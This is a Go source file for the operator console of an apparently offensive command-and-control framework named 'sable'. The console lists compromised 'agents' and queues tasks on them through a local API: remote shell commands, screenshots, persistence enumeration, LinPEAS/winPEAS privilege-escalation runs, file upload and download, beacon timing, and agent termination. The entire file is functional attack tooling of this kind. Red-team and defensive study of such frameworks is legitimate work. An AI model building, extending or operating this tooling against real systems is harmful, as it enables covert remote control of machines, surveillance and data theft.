package cli

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
)

const (
	maxTaskPayloadBytes = 48 * 1024
	maxRemotePathBytes  = 4096
)

// CLI is the interactive operator shell that talks to the REST API.
type CLI struct {
	baseURL string
	token   string
	client  *http.Client
}

// New creates a CLI targeting the operator API at baseURL with the given JWT.
// InsecureSkipVerify is only allowed for loopback API URLs.
func New(baseURL, token string) (*CLI, error) {
	if err := requireLoopbackBaseURL(baseURL); err != nil {
		return nil, err
	}
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
	}
	return &CLI{baseURL: baseURL, token: token, client: &http.Client{Transport: tr}}, nil
}

// Run starts the interactive shell. Blocks until the user types "exit" or "quit".
func (c *CLI) Run() {
	fmt.Println("[sable] operator shell. Type 'help' for commands.")
	scanner := bufio.NewScanner(os.Stdin)
	activeAgent := ""

	for {
		if activeAgent == "" {
			fmt.Print("[sable]> ")
		} else {
			short := activeAgent
			if len(short) > 8 {
				short = short[:8]
			}
			fmt.Printf("[%s]> ", short)
		}

		if !scanner.Scan() {
			break
		}
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		parts := strings.SplitN(line, " ", 3)
		cmd := parts[0]

		switch cmd {
		case "exit", "quit":
			return
		case "help":
			fmt.Println("  agents                       - list active sessions")
			fmt.Println("  register <id> <secret-hex>   - pre-register an agent (run before deploying)")
			fmt.Println("  use <agent-id>               - interact with a session")
			fmt.Println("  back                         - return to main prompt")
			fmt.Println("  shell <cmd>                  - run shell command on active agent")
			fmt.Println("  ps                           - list processes on active agent")
			fmt.Println("  screenshot                   - capture one bounded screenshot")
			fmt.Println("  persistence                  - list common persistence locations")
			fmt.Println("  peas                         - run LinPEAS or winPEAS based on agent OS")
			fmt.Println("  snapshot                     - collect host snapshot report")
			fmt.Println("  ls <path>                    - list remote directory")
			fmt.Println("  cancel <task-id>             - cancel supported running background task")
			fmt.Println("  sleep <seconds>              - update beacon interval")
			fmt.Println("  download <path>              - download file from agent")
			fmt.Println("  upload <src> <dst>           - upload local file to agent (src:dst)")
			fmt.Println("  kill                         - terminate active agent")
			fmt.Println("  exit                         - quit")
		case "agents":
			c.listAgents()
		case "register":
			if len(parts) < 3 {
				fmt.Println("usage: register <agent-id> <secret-hex>")
				continue
			}
			c.registerAgent(parts[1], parts[2])
		case "use":
			if len(parts) < 2 {
				fmt.Println("usage: use <agent-id>")
				continue
			}
			activeAgent = parts[1]
			fmt.Printf("[*] interacting with %s\n", activeAgent)
		case "back":
			activeAgent = ""
		case "shell", "download", "sleep", "kill", "ps", "screenshot", "persistence", "peas", "snapshot", "ls", "cancel":
			if activeAgent == "" {
				fmt.Println("[-] no active agent; use 'use <agent-id>'")
				continue
			}
			payload := ""
			if len(parts) > 1 {
				payload = strings.Join(parts[1:], " ")
			}
			c.queueTask(activeAgent, cmd, payload)
		case "upload":
			if activeAgent == "" {
				fmt.Println("[-] no active agent; use 'use <agent-id>'")
				continue
			}
			if len(parts) < 3 {
				fmt.Println("usage: upload <local-path> <remote-path>")
				continue
			}
			payload, err := buildUploadPayload(parts[1], parts[2])
			if err != nil {
				fmt.Printf("[-] %v\n", err)
				continue
			}
			c.queueTask(activeAgent, cmd, payload)
		default:
			fmt.Printf("[-] unknown command: %q\n", cmd)
		}
	}
}

func (c *CLI) listAgents() {
	req, err := http.NewRequest("GET", c.baseURL+"/api/agents", nil)
	if err != nil {
		fmt.Printf("[-] %v\n", err)
		return
	}
	req.Header.Set("Authorization", "Bearer "+c.token)
	resp, err := c.client.Do(req)
	if err != nil {
		fmt.Printf("[-] %v\n", err)
		return
	}
	defer resp.Body.Close()
	var agents []map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&agents); err != nil {
		fmt.Printf("[-] decode error: %v\n", err)
		return
	}
	if len(agents) == 0 {
		fmt.Println("[*] no active sessions")
		return
	}
	fmt.Printf("  %-36s  %-20s  %-10s  %s\n", "ID", "HOSTNAME", "OS", "LAST SEEN")
	for _, a := range agents {
		fmt.Printf("  %-36s  %-20s  %-10s  %s\n",
			strVal(a, "id"), strVal(a, "hostname"), strVal(a, "os"), strVal(a, "last_seen"))
	}
}

func (c *CLI) registerAgent(agentID, secretHex string) {
	body, _ := json.Marshal(map[string]string{"id": agentID, "secret_hex": secretHex})
	req, err := http.NewRequest("POST", c.baseURL+"/api/agents", bytes.NewReader(body))
	if err != nil {
		fmt.Printf("[-] %v\n", err)
		return
	}
	req.Header.Set("Authorization", "Bearer "+c.token)
	req.Header.Set("Content-Type", "application/json")
	resp, err := c.client.Do(req)
	if err != nil {
		fmt.Printf("[-] %v\n", err)
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode == http.StatusCreated {
		fmt.Printf("[+] agent registered: %s\n", agentID)
	} else {
		fmt.Printf("[-] registration failed: %d\n", resp.StatusCode)
	}
}

func (c *CLI) queueTask(agentID, taskType, payload string) {
	body, _ := json.Marshal(map[string]string{"type": taskType, "payload": payload})
	req, err := http.NewRequest("POST", c.baseURL+"/api/agents/"+agentID+"/task", bytes.NewReader(body))
	if err != nil {
		fmt.Printf("[-] %v\n", err)
		return
	}
	req.Header.Set("Authorization", "Bearer "+c.token)
	req.Header.Set("Content-Type", "application/json")
	resp, err := c.client.Do(req)
	if err != nil {
		fmt.Printf("[-] %v\n", err)
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode == http.StatusOK {
		var result map[string]string
		json.NewDecoder(resp.Body).Decode(&result) //nolint:errcheck
		fmt.Printf("[+] task queued: %s\n", result["task_id"])
	} else {
		data, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
		message := strings.TrimSpace(string(data))
		if message == "" {
			fmt.Printf("[-] server returned %d\n", resp.StatusCode)
			return
		}
		fmt.Printf("[-] server returned %d: %s\n", resp.StatusCode, message)
	}
}

func buildUploadPayload(localPath, remotePath string) (string, error) {
	if strings.TrimSpace(localPath) == "" || strings.TrimSpace(remotePath) == "" {
		return "", fmt.Errorf("usage: upload <local-path> <remote-path>")
	}
	if len(remotePath) > maxRemotePathBytes || strings.ContainsAny(remotePath, "\x00\r\n") {
		return "", fmt.Errorf("remote path must be 1-%d bytes without control characters", maxRemotePathBytes)
	}

	data, err := os.ReadFile(localPath)
	if err != nil {
		return "", fmt.Errorf("read local file: %w", err)
	}
	encodedLen := base64.StdEncoding.EncodedLen(len(data))
	payloadLen := len(remotePath) + 1 + encodedLen
	if payloadLen > maxTaskPayloadBytes {
		return "", fmt.Errorf("upload payload too large after base64 encoding: %d bytes (max %d)", payloadLen, maxTaskPayloadBytes)
	}
	return remotePath + ":" + base64.StdEncoding.EncodeToString(data), nil
}

func strVal(m map[string]interface{}, key string) string {
	if v, ok := m[key]; ok {
		return fmt.Sprintf("%v", v)
	}
	return ""
}

func requireLoopbackBaseURL(baseURL string) error {
	u, err := url.Parse(baseURL)
	if err != nil {
		return fmt.Errorf("invalid API URL: %w", err)
	}
	host := u.Hostname()
	if host == "" {
		return fmt.Errorf("API URL must include a hostname")
	}
	ip := net.ParseIP(host)
	if ip != nil && ip.IsLoopback() {
		return nil
	}
	if strings.EqualFold(host, "localhost") {
		return nil
	}
	return fmt.Errorf("CLI only permits insecure TLS to loopback API URLs, got %q", host)
}
